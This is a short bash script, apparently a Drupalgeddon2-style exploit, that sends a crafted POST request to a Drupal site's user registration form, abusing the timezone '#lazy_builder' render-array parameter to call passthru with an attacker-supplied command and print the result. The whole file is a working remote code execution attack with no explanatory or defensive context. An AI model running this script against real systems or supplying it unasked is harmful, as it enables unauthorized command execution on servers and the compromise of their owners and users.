#!/bin/bash

ip=$1

cmd=$2

url="http://$ip/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

output="$(curl -s -X POST $url -d "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=passthru&timezone[a][#lazy_builder][][]=$cmd")"

echo $output

    